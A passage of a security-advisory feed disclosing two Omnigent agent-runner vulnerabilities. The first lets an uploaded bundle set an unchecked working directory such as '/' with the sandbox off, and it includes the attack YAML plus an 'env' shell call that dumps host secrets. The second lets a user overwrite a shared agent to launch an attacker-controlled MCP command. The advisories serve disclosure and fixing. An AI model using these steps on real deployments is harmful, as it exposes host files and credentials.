-<p>An authenticated, non-admin user can obtain <strong>arbitrary host-filesystem read/write</strong> (and host environment-secret disclosure) on an Omnigent <strong>runner</strong> by uploading an agent bundle whose <code>os_env.cwd</code> points outside any intended workspace (e.g. <code>/</code> or <code>/home/&lt;victim&gt;</code>). The <code>cwd</code> field is taken <strong>verbatim</strong> from the bundle with no validation, normalization, or boundary check anywhere in the spec pipeline.</p>
-<p>This is a <strong>different sink</strong> from GHSA-jrrm-9hc7-2v3h (CWE-94, shared-agent bundle overwrite -&gt; stdio MCP RCE). It shares the bundle-upload <em>vector</em> but is reached through the user's <strong>own</strong> session-scoped agent and is <strong>not</strong> addressed by that advisory's proposed shared-agent guard.</p>
-<h3 id="preconditions">Preconditions</h3>
-<ul>
-<li>Runner realizes a session-scoped uploaded bundle <strong>without</strong> <code>OMNIGENT_RUNNER_WORKSPACE</code> set. When that env var is set (CLI- and host-launched sessions set it), the spec <code>cwd</code> is overridden and the attack is neutralized — so this is deployment-gated, not universal.</li>
-<li>Attacker is any authenticated user (no admin scope; <code>_require_user</code> only checks identity). No shared-agent overwrite needed.</li>
-</ul>
-<h3 id="details-verified-against-code">Details (verified against code)</h3>
-<ol>
-<li><strong>Parse — no validation.</strong> <code>omnigent/spec/parser.py:696</code> stores <code>cwd=str(cwd_raw)</code> verbatim. Absolute paths (<code>/</code>, <code>/etc</code>), <code>../..</code>, etc. are all accepted. The <code>sandbox.type</code> is likewise author-chosen and <code>"none"</code> is legal.</li>
-<li><strong>Validate — cwd unconstrained.</strong> <code>omnigent/spec/validator.py</code> <code>_validate_os_env</code> checks only fork/scratch/egress combinations; it never references <code>cwd</code> (the sole mention, line ~526, is a comment). No boundary is applied to the cwd itself. The boundary in <code>server/schemas.py</code> validates a <em>caller-supplied workspace against</em> the spec cwd (treating the author cwd as trusted) and only for host-launched sessions — it does not bound the cwd.</li>
-<li><strong>Sink.</strong> <code>omnigent/inner/os_env.py:890</code> sets <code>cwd = Path(spec.cwd or os.getcwd()).resolve(strict=False)</code> as the environment root; <code>os_env.py:934</code> does <code>shutil.copytree(src=cwd, ...)</code> when <code>fork=true</code>. All agent file/shell tools are bounded by <code>_assert_within_cwd</code> (<code>os_env.py:1040</code>), which checks <code>resolved.relative_to(cwd)</code> — but since <strong>cwd is attacker-controlled</strong>, <code>cwd=/</code> makes the entire host filesystem in-bounds for read and write; <code>fork=true</code> with <code>cwd=/home/victim</code> copies that tree into the agent-readable workspace.</li>
-<li><strong>Decisive gate.</strong> <code>omnigent/runner/resource_registry.py:648-654</code>: <code>cwd = default_cwd</code> only when <code>self._runner_workspace is not None or spec_os_env.cwd in (None, ".", "./")</code>; otherwise <code>cwd = spec_os_env.cwd</code> (the attacker's absolute path). So <code>OMNIGENT_RUNNER_WORKSPACE</code> is the only thing standing between the spec and the host FS — and it is an operational control, not an in-code guard. A code comment at <code>tool_dispatch.py:~4207</code> claims cwd "is treated as a boundary at session-create time," which is not true on this path.</li>
-</ol>
-<h3 id="attack-path">Attack path</h3>
-<ol>
-<li>Authenticated user sends <code>POST /v1/sessions</code> (multipart) with an agent bundle whose <code>config.yaml</code> contains:<pre><code class="language-yaml">os_env:
-  cwd: "/"            # or /home/&lt;victim&gt;, with fork: true for one-shot exfil
-  sandbox: { type: none }
-</code></pre>
-</li>
-<li>On a runner without <code>OMNIGENT_RUNNER_WORKSPACE</code>, the agent's <code>sys_os_read</code>/<code>write</code>/<code>edit</code>/<code>shell</code> tools now operate over the whole host filesystem, and (sandbox inactive) inherit the runner's full environment — exposing host secrets via e.g. <code>sys_os_shell("env")</code>.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Arbitrary host-filesystem read/write and runner-environment secret disclosure, available to any authenticated user on an affected deployment. High severity (deployment-conditional).</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Add a control on the <code>cwd</code> field itself in <code>omnigent/spec/_validate_os_env</code> (and/or at parse): reject absolute paths and <code>..</code> traversal, and require <code>cwd</code> to resolve within the runner workspace / an allow-listed root. Do not rely on <code>OMNIGENT_RUNNER_WORKSPACE</code> being set as the sole defense. Consider also disallowing bundle-author <code>sandbox.type: none</code> for server-realized (non-CLI) sessions.</p>
-<h3 id="related">Related</h3>
-<p>GHSA-jrrm-9hc7-2v3h (same bundle-upload vector, different sink; that fix does not cover this).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-p8rw-8qj3-hf33">https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-p8rw-8qj3-hf33</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62677">https://nvd.nist.gov/vuln/detail/CVE-2026-62677</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/pull/1417">https://github.com/omnigent-ai/omnigent/pull/1417</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/commit/7ca0cca3c9a65c04c489edf68f0e080424a26868">https://github.com/omnigent-ai/omnigent/commit/7ca0cca3c9a65c04c489edf68f0e080424a26868</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0">https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-p8rw-8qj3-hf33">https://github.com/advisories/GHSA-p8rw-8qj3-hf33</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p8rw-8qj3-hf33</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-02T22:00:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[omnigent] Omnigent: Shared Agent Bundle Overwrite Leads to Authenticated Runner RCE]]></title>
-        <id>https://github.com/advisories/GHSA-jrrm-9hc7-2v3h</id>
-        <link href="https://github.com/advisories/GHSA-jrrm-9hc7-2v3h"/>
-        <updated>2026-09-02T21:55:14.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An authenticated user with edit access to their own session can overwrite a shared/template agent by uploading a full agent bundle through <code>PUT /sessions/{session_id}/agent</code>.</p>
-<p>Shared/template agents are shown as not MCP-editable, but this upload path still accepts a replacement bundle. By adding a <code>stdio</code> MCP server to the shared agent, the attacker can cause future runner sessions using that shared agent to start an attacker-controlled command.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable endpoint is the full agent bundle upload route: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18979-L19077"><code>PUT /sessions/{session_id}/agent</code></a> 
-This route checks whether the caller can edit the session: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L19003-L19025"><code>LEVEL_EDIT</code> session permission check</a>
-But it does not check whether the bound agent is a shared/template agent.
-Shared/template agents have:</p>
-<pre><code class="language-python">agent.session_id is None
-</code></pre>
-<p>The API already exposes that these agents are not meant to be MCP-editable: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L18842-L18857"><code>mcp_servers_editable</code> is false for shared/template agents</a>
-The direct MCP edit endpoint correctly blocks shared/template agents: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/session_mcp_servers.py#L170-L183"><code>session_mcp_servers.py</code> shared-agent guard</a></p>
-<pre><code class="language-python">if agent.session_id is None:
-    raise OmnigentError("Built-in agents are read-only through this endpoint.")
-</code></pre>
-<p>The full bundle upload endpoint is missing that same guard. It stores the uploaded bundle and updates the agent row: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/server/routes/sessions.py#L19050-L19077"><code>agent_store.update(agent.id, new_loc)</code></a>
-For shared/template agents, this changes the shared agent itself, not only the attacker's session.
-This becomes command execution because <code>stdio</code> MCP servers start the configured command as a runner subprocess: <a href="https://github.com/omnigent-ai/omnigent/blob/10f5ae3110e162f96fb99bb6662c581abdc56cd6/omnigent/tools/mcp.py#L971-L1021"><code>tools/mcp.py</code> stdio subprocess launch</a></p>
-<p>Suggested fix: add the same <code>agent.session_id is None</code> guard to <code>PUT /sessions/{session_id}/agent</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>This is authenticated RCE against Omnigent runner hosts. A normal authenticated user with edit access to their own session can poison a shared/template agent bundle, even though that agent is shown as not MCP-editable. The poisoned bundle can then be used by future sessions created from the same shared agent.</p>
-<p>Because <code>stdio</code> MCP servers run as local subprocesses, the attacker-controlled command executes with the permissions of the Omnigent runner process. In a shared or company-hosted deployment, this can let an attacker read runner-accessible files and credentials, modify workspace data, disrupt runner availability, pivot to internal services reachable from the runner, or establish an interactive remote shell if outbound networking is allowed.</p>
-<p>This is high impact because it turns normal shared-agent session access into command execution on runner infrastructure used by other sessions.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-jrrm-9hc7-2v3h">https://github.com/omnigent-ai/omnigent/security/advisories/GHSA-jrrm-9hc7-2v3h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62674">https://nvd.nist.gov/vuln/detail/CVE-2026-62674</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/pull/1418">https://github.com/omnigent-ai/omnigent/pull/1418</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/commit/25a22dc9e6da4648d23749f0a589e47e6aed991b">https://github.com/omnigent-ai/omnigent/commit/25a22dc9e6da4648d23749f0a589e47e6aed991b</a></li>
-<li><a href="https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0">https://github.com/omnigent-ai/omnigent/releases/tag/v0.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jrrm-9hc7-2v3h">https://github.com/advisories/GHSA-jrrm-9hc7-2v3h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jrrm-9hc7-2v3h</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-02T21:55:11.000Z</published>
     </entry>
 </feed>
